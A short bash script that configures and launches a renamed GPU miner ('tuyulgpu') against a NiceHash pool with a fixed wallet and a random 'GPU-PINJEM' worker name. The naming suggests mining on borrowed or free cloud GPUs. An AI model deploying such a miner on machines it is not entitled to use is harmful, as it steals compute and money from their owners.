#!/bin/bash

POOL=stratum+tcp://daggerhashimoto.eu.nicehash.com:3353

WALLET=3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH

WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)

chmod +x tuyulgpu

./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
